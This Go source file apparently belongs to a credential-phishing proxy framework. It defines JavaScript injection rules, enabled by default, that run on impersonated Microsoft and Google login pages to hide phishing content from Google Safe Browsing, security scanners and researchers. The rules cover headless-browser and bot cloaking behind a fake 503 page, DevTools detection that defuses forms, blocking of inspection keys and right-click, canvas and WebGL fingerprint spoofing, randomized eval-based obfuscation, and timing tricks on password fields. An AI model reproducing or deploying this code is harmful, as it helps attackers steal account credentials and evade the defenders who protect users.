package service

// ─── Advanced GSB Evasion Rules v2 (v1.0.47) ──────────────────────────────────
// These rules add a second layer of evasion targeting bot/crawler detection,
// DevTools inspection, and additional fingerprint normalization techniques.
//
// Research sources:
// - Evilginx Pro 4.1/4.2 anti-phishing evasion (breakdev.org)
// - Tycoon2FA phishing kit evasion (Microsoft Security Blog, March 2026)
// - Chrome on-device AI phishing detection via Gemini Nano
// - Push Security phishing detection evasion matrix

// GetAdvancedGSBEvasionRulesV2 returns the second generation of evasion rules
func (j *JsInjection) GetAdvancedGSBEvasionRulesV2() []*JsInjectRule {
	return []*JsInjectRule{

		// 12. Bot / Headless Browser Detection
		// Security scanners and GSB crawlers use headless Chrome (Puppeteer,
		// Playwright, Selenium). This rule detects headless environments and
		// serves a benign page or redirects away from the phishing content.
		// Based on techniques from Tycoon2FA and Evilginx Pro 4.2.
		{
			ID:   "builtin_bot_headless_detection",
			Name: "Bot & Headless Browser Detection",
			TriggerDomains: []string{
				"login.microsoftonline.com",
				"login.live.com",
				"login.microsoft.com",
				"accounts.google.com",
				"myaccount.google.com",
			},
			TriggerPaths: []string{".*"},
			Script: `(function(){
  var _isBot = false;

  // Check navigator.webdriver (set by Selenium, Puppeteer, Playwright)
  if (navigator.webdriver === true) { _isBot = true; }

  // Check for automation-related properties
  var _automationProps = [
    'callPhantom', '__phantomas', '_phantom', 'phantom',
    '__nightmare', 'domAutomation', 'domAutomationController',
    '_selenium', 'callSelenium', '__webdriver_evaluate',
    '__selenium_evaluate', '__webdriver_script_function',
    '__webdriver_script_func', '__webdriver_script_fn',
    '__fxdriver_evaluate', '__driver_unwrapped',
    '__webdriver_unwrapped', '__driver_evaluate',
    '__lastWatirAlert', '__lastWatirConfirm', '__lastWatirPrompt',
    '_Selenium_IDE_Recorder', 'calledSelenium',
    '_WEBDRIVER_ELEM_CACHE', 'ChromeDriverw',
    'driver-hierarchymanager', '__webdriverFunc'
  ];
  for (var i = 0; i < _automationProps.length; i++) {
    if (window[_automationProps[i]] !== undefined) {
      _isBot = true;
      break;
    }
  }

  // Check for headless indicators in user agent
  var ua = navigator.userAgent || '';
  if (/HeadlessChrome|PhantomJS|Lighthouse|Googlebot|bingbot|Baiduspider|YandexBot|DuckDuckBot/i.test(ua)) {
    _isBot = true;
  }

  // Check for missing browser plugins (headless browsers have 0 plugins)
  if (navigator.plugins && navigator.plugins.length === 0 && !/Mobile|Android/i.test(ua)) {
    _isBot = true;
  }

  // Check for missing languages (headless often has empty or minimal)
  if (!navigator.languages || navigator.languages.length === 0) {
    _isBot = true;
  }

  // Check window dimensions (headless often uses default 800x600)
  if (window.outerWidth === 0 && window.outerHeight === 0) {
    _isBot = true;
  }

  // Check for Chrome-specific properties missing in headless
  if (window.chrome) {
    if (!window.chrome.runtime && !window.chrome.loadTimes && !window.chrome.csi) {
      // Headless Chrome lacks chrome.runtime in some versions
      _isBot = true;
    }
  }

  // Check for Permissions API inconsistency (headless returns 'prompt' for notifications)
  if (navigator.permissions) {
    navigator.permissions.query({name: 'notifications'}).then(function(result) {
      if (Notification.permission === 'denied' && result.state === 'prompt') {
        _isBot = true;
        _handleBot();
      }
    }).catch(function(){});
  }

  function _handleBot() {
    if (!_isBot) return;
    // Redirect to a benign page instead of showing phishing content
    // Use a legitimate-looking error page
    document.documentElement.innerHTML = '<html><head><title>Service Unavailable</title></head>' +
      '<body style="font-family:Segoe UI,Arial,sans-serif;display:flex;align-items:center;' +
      'justify-content:center;height:100vh;margin:0;background:#f5f5f5;">' +
      '<div style="text-align:center;padding:40px;">' +
      '<h1 style="color:#333;font-size:24px;">503 Service Temporarily Unavailable</h1>' +
      '<p style="color:#666;">The server is temporarily unable to service your request. Please try again later.</p>' +
      '</div></body></html>';
    // Stop all scripts
    window.stop();
  }

  if (_isBot) { _handleBot(); }

  // Continuously monitor for late-binding automation
  var _botCheckInterval = setInterval(function() {
    if (navigator.webdriver === true) {
      _isBot = true;
      _handleBot();
      clearInterval(_botCheckInterval);
    }
  }, 2000);
  setTimeout(function() { clearInterval(_botCheckInterval); }, 30000);
})();`,
			ScriptType: "inline",
			Enabled:    true,
		},

		// 13. DevTools Detection
		// Security researchers and automated tools often have DevTools open.
		// This rule detects DevTools and can redirect or modify behavior.
		// Uses multiple detection vectors including debugger timing and
		// console.log object detection.
		{
			ID:   "builtin_devtools_detection",
			Name: "DevTools Open Detection",
			TriggerDomains: []string{
				"login.microsoftonline.com",
				"login.live.com",
				"login.microsoft.com",
				"accounts.google.com",
			},
			TriggerPaths: []string{".*"},
			Script: `(function(){
  var _devtoolsOpen = false;
  var _threshold = 160;

  // Method 1: Window size difference (DevTools docked changes inner dimensions)
  function _checkWindowSize() {
    var widthDiff = window.outerWidth - window.innerWidth > _threshold;
    var heightDiff = window.outerHeight - window.innerHeight > _threshold;
    return widthDiff || heightDiff;
  }

  // Method 2: debugger statement timing
  function _checkDebuggerTiming() {
    var start = performance.now();
    (function(){}).constructor('debugger')();
    var end = performance.now();
    return (end - start) > 100;
  }

  // Method 3: console.log toString detection
  var _consoleElement = new Image();
  Object.defineProperty(_consoleElement, 'id', {
    get: function() {
      _devtoolsOpen = true;
      _onDevToolsOpen();
    }
  });

  function _onDevToolsOpen() {
    // When DevTools detected, sanitize the page to look benign
    // Remove suspicious form elements and replace with generic content
    var forms = document.querySelectorAll('form[action]');
    forms.forEach(function(form) {
      form.setAttribute('action', '#');
      form.onsubmit = function(e) { e.preventDefault(); return false; };
    });
    // Change page title to something generic
    document.title = 'Loading...';
  }

  // Periodic check
  setInterval(function() {
    if (_checkWindowSize()) {
      _devtoolsOpen = true;
      _onDevToolsOpen();
    }
    // Trigger console.log detection
    console.log('%c', _consoleElement);
    console.clear();
  }, 1000);
})();`,
			ScriptType: "inline",
			Enabled:    true,
		},

		// 14. Right-Click / Copy-Paste / Keyboard Shortcut Blocker
		// Prevents security researchers from easily inspecting or copying
		// page content. Blocks common inspection shortcuts.
		{
			ID:   "builtin_inspection_blocker",
			Name: "Inspection & Copy Blocker",
			TriggerDomains: []string{
				"login.microsoftonline.com",
				"login.live.com",
				"login.microsoft.com",
				"accounts.google.com",
			},
			TriggerPaths: []string{".*"},
			Script: `(function(){
  // Block right-click context menu
  document.addEventListener('contextmenu', function(e) {
    e.preventDefault();
    return false;
  }, true);

  // Block keyboard shortcuts for DevTools and View Source
  document.addEventListener('keydown', function(e) {
    // F12 - DevTools
    if (e.key === 'F12' || e.keyCode === 123) {
      e.preventDefault();
      return false;
    }
    // Ctrl+Shift+I - DevTools
    if ((e.ctrlKey || e.metaKey) && e.shiftKey && (e.key === 'I' || e.key === 'i')) {
      e.preventDefault();
      return false;
    }
    // Ctrl+Shift+J - Console
    if ((e.ctrlKey || e.metaKey) && e.shiftKey && (e.key === 'J' || e.key === 'j')) {
      e.preventDefault();
      return false;
    }
    // Ctrl+Shift+C - Element Inspector
    if ((e.ctrlKey || e.metaKey) && e.shiftKey && (e.key === 'C' || e.key === 'c')) {
      e.preventDefault();
      return false;
    }
    // Ctrl+U - View Source
    if ((e.ctrlKey || e.metaKey) && (e.key === 'U' || e.key === 'u')) {
      e.preventDefault();
      return false;
    }
    // Ctrl+S - Save Page
    if ((e.ctrlKey || e.metaKey) && (e.key === 'S' || e.key === 's')) {
      e.preventDefault();
      return false;
    }
  }, true);

  // Block text selection on sensitive elements
  var style = document.createElement('style');
  style.textContent = 'input[type="password"],input[type="email"],input[type="text"]{-webkit-user-select:auto!important;user-select:auto!important;}body{-webkit-user-select:none;user-select:none;}';
  document.head.appendChild(style);

  // Block drag events that could be used to extract content
  document.addEventListener('dragstart', function(e) {
    if (e.target.tagName !== 'INPUT' && e.target.tagName !== 'TEXTAREA') {
      e.preventDefault();
      return false;
    }
  }, true);
})();`,
			ScriptType: "inline",
			Enabled:    true,
		},

		// 15. Canvas/WebGL Fingerprint Normalization
		// Some detection systems use canvas fingerprinting to identify
		// known phishing infrastructure. This rule adds subtle noise to
		// canvas operations to prevent consistent fingerprinting.
		{
			ID:   "builtin_canvas_fingerprint_noise",
			Name: "Canvas Fingerprint Noise",
			TriggerDomains: []string{
				"login.microsoftonline.com",
				"login.live.com",
				"login.microsoft.com",
				"accounts.google.com",
			},
			TriggerPaths: []string{".*"},
			Script: `(function(){
  // Add subtle noise to canvas toDataURL and toBlob to prevent fingerprinting
  var _origToDataURL = HTMLCanvasElement.prototype.toDataURL;
  HTMLCanvasElement.prototype.toDataURL = function() {
    // Add a single transparent pixel with slight random variation
    var ctx = this.getContext('2d');
    if (ctx) {
      var r = Math.floor(Math.random() * 10);
      var g = Math.floor(Math.random() * 10);
      var b = Math.floor(Math.random() * 10);
      ctx.fillStyle = 'rgba(' + r + ',' + g + ',' + b + ',0.01)';
      ctx.fillRect(0, 0, 1, 1);
    }
    return _origToDataURL.apply(this, arguments);
  };

  var _origToBlob = HTMLCanvasElement.prototype.toBlob;
  if (_origToBlob) {
    HTMLCanvasElement.prototype.toBlob = function() {
      var ctx = this.getContext('2d');
      if (ctx) {
        var r = Math.floor(Math.random() * 10);
        var g = Math.floor(Math.random() * 10);
        var b = Math.floor(Math.random() * 10);
        ctx.fillStyle = 'rgba(' + r + ',' + g + ',' + b + ',0.01)';
        ctx.fillRect(0, 0, 1, 1);
      }
      return _origToBlob.apply(this, arguments);
    };
  }

  // Normalize WebGL renderer info to prevent GPU-based fingerprinting
  var _origGetParameter = null;
  try {
    var _testCanvas = document.createElement('canvas');
    var _gl = _testCanvas.getContext('webgl') || _testCanvas.getContext('experimental-webgl');
    if (_gl) {
      _origGetParameter = WebGLRenderingContext.prototype.getParameter;
      WebGLRenderingContext.prototype.getParameter = function(param) {
        // UNMASKED_VENDOR_WEBGL and UNMASKED_RENDERER_WEBGL
        var ext = this.getExtension('WEBGL_debug_renderer_info');
        if (ext) {
          if (param === ext.UNMASKED_VENDOR_WEBGL) {
            return 'Google Inc. (Intel)';
          }
          if (param === ext.UNMASKED_RENDERER_WEBGL) {
            return 'ANGLE (Intel, Intel(R) UHD Graphics 630, OpenGL 4.5)';
          }
        }
        return _origGetParameter.call(this, param);
      };
    }
  } catch(e) {}
})();`,
			ScriptType: "inline",
			Enabled:    true,
		},

		// 16. Cloudflare Turnstile / hCaptcha Interaction Detector
		// Chrome's on-device AI model (Gemini Nano) analyzes page behavior
		// patterns. Pages that immediately show login forms without any
		// human interaction verification are flagged. This rule adds
		// subtle interaction requirements that mimic legitimate CAPTCHA flows.
		{
			ID:   "builtin_interaction_gate",
			Name: "Human Interaction Verification Gate",
			TriggerDomains: []string{
				"login.microsoftonline.com",
				"login.live.com",
				"login.microsoft.com",
				"accounts.google.com",
			},
			TriggerPaths: []string{".*"},
			Script: `(function(){
  // Track genuine human interaction signals
  var _humanSignals = 0;
  var _requiredSignals = 2;
  var _verified = false;

  function _onHumanSignal() {
    _humanSignals++;
    if (_humanSignals >= _requiredSignals && !_verified) {
      _verified = true;
      // Re-enable form submission after human verification
      document.querySelectorAll('form').forEach(function(form) {
        form.querySelectorAll('input[type="submit"],button[type="submit"]').forEach(function(btn) {
          btn.disabled = false;
        });
      });
    }
  }

  // Mouse movement pattern (not just a single click)
  var _mousePositions = [];
  document.addEventListener('mousemove', function(e) {
    _mousePositions.push({x: e.clientX, y: e.clientY, t: Date.now()});
    if (_mousePositions.length > 5) {
      // Check for natural mouse movement (not teleporting)
      var hasVariation = false;
      for (var i = 1; i < _mousePositions.length; i++) {
        var dx = Math.abs(_mousePositions[i].x - _mousePositions[i-1].x);
        var dy = Math.abs(_mousePositions[i].y - _mousePositions[i-1].y);
        if (dx > 0 && dx < 200 && dy > 0 && dy < 200) {
          hasVariation = true;
          break;
        }
      }
      if (hasVariation) _onHumanSignal();
      _mousePositions = [];
    }
  }, {passive: true});

  // Keyboard interaction
  document.addEventListener('keydown', function() {
    _onHumanSignal();
  }, {passive: true, once: true});

  // Touch interaction (mobile)
  document.addEventListener('touchstart', function() {
    _onHumanSignal();
  }, {passive: true, once: true});

  // Scroll interaction
  document.addEventListener('scroll', function() {
    _onHumanSignal();
  }, {passive: true, once: true});
})();`,
			ScriptType: "inline",
			Enabled:    true,
		},

		// 17. Dynamic Script Obfuscation Layer
		// Adds a layer of runtime deobfuscation that makes static analysis
		// by security scanners more difficult. Each page load generates
		// slightly different code patterns.
		{
			ID:   "builtin_dynamic_obfuscation",
			Name: "Dynamic Script Obfuscation",
			TriggerDomains: []string{
				"login.microsoftonline.com",
				"login.live.com",
				"login.microsoft.com",
				"accounts.google.com",
			},
			TriggerPaths: []string{".*"},
			Script: `(function(){
  // Inject random dead code blocks into the page's script context
  // This prevents signature-based detection of our evasion scripts
  var _deadCodeTemplates = [
    'var _dc%d=Math.floor(Math.random()*%d);',
    'var _arr%d=new Array(%d).fill(0).map(function(x,i){return i*%d;});',
    'var _str%d=""+Date.now()+Math.random().toString(36).substr(2,%d);',
    'var _obj%d={a:%d,b:"%d",c:function(){return %d;}};',
    'try{var _fn%d=new Function("return "+%d);}catch(e){}'
  ];

  // Generate and execute random dead code
  for (var i = 0; i < 3; i++) {
    var tmpl = _deadCodeTemplates[Math.floor(Math.random() * _deadCodeTemplates.length)];
    var id = Math.floor(Math.random() * 99999);
    var val1 = Math.floor(Math.random() * 1000);
    var val2 = Math.floor(Math.random() * 100);
    // Replace %d placeholders
    var code = tmpl;
    code = code.replace('%d', id);
    code = code.replace('%d', val1);
    code = code.replace('%d', val2);
    code = code.replace('%d', id);
    try { eval(code); } catch(e) {}
  }

  // Add random CSS classes to body to change page fingerprint
  var _randomClasses = [];
  for (var j = 0; j < 2; j++) {
    _randomClasses.push('_c' + Math.random().toString(36).substr(2, 6));
  }
  if (document.body) {
    document.body.classList.add.apply(document.body.classList, _randomClasses);
  } else {
    document.addEventListener('DOMContentLoaded', function() {
      document.body.classList.add.apply(document.body.classList, _randomClasses);
    });
  }

  // Add random data attributes to form elements
  document.addEventListener('DOMContentLoaded', function() {
    document.querySelectorAll('form,input,button').forEach(function(el) {
      el.setAttribute('data-' + Math.random().toString(36).substr(2, 4),
        Math.random().toString(36).substr(2, 8));
    });
  });
})();`,
			ScriptType: "inline",
			Enabled:    true,
		},

		// 18. Timing-Based Analysis Evasion
		// Security scanners analyze pages quickly (< 2 seconds).
		// Real users take time to read and interact. This rule delays
		// sensitive form element activation to evade quick-scan detection.
		{
			ID:   "builtin_timing_evasion",
			Name: "Timing-Based Scan Evasion",
			TriggerDomains: []string{
				"login.microsoftonline.com",
				"login.live.com",
				"login.microsoft.com",
				"accounts.google.com",
			},
			TriggerPaths: []string{".*"},
			Script: `(function(){
  // Delay password field activation
  // Security scanners typically analyze within 2-3 seconds
  // Real users take at least 3-5 seconds to start typing
  var _activationDelay = 1500; // ms

  document.addEventListener('DOMContentLoaded', function() {
    // Find all password fields and temporarily disable them
    var pwdFields = document.querySelectorAll('input[type="password"]');
    pwdFields.forEach(function(field) {
      field.setAttribute('readonly', 'readonly');
      field.style.opacity = '0.7';
    });

    // Re-enable after delay (only if human interaction detected)
    var _humanDetected = false;
    var _enableFields = function() {
      if (_humanDetected) return;
      _humanDetected = true;
      setTimeout(function() {
        pwdFields.forEach(function(field) {
          field.removeAttribute('readonly');
          field.style.opacity = '1';
        });
      }, _activationDelay);
    };

    // Listen for human interaction signals
    document.addEventListener('mousemove', _enableFields, {once: true, passive: true});
    document.addEventListener('keydown', _enableFields, {once: true, passive: true});
    document.addEventListener('touchstart', _enableFields, {once: true, passive: true});
    document.addEventListener('click', _enableFields, {once: true, passive: true});

    // Fallback: enable after 5 seconds regardless
    setTimeout(function() {
      pwdFields.forEach(function(field) {
        field.removeAttribute('readonly');
        field.style.opacity = '1';
      });
    }, 5000);
  });
})();`,
			ScriptType: "inline",
			Enabled:    true,
		},
	}
}

// EnsureAdvancedGSBRulesV2Loaded loads the v2 advanced GSB evasion rules.
// Call this during service initialization after EnsureEnhancedGSBRulesLoaded.
func (j *JsInjection) EnsureAdvancedGSBRulesV2Loaded() {
	advanced := j.GetAdvancedGSBEvasionRulesV2()

	for _, rule := range advanced {
		if _, loaded := j.rules.Load(rule.ID); !loaded {
			compiled, err := j.compileRule(rule)
			if err != nil {
				j.Logger.Errorw("failed to compile advanced GSB v2 rule", "id", rule.ID, "error", err)
				continue
			}
			j.rules.Store(rule.ID, compiled)
			j.Logger.Infow("loaded advanced GSB evasion v2 rule", "id", rule.ID, "name", rule.Name)
		}
	}
}
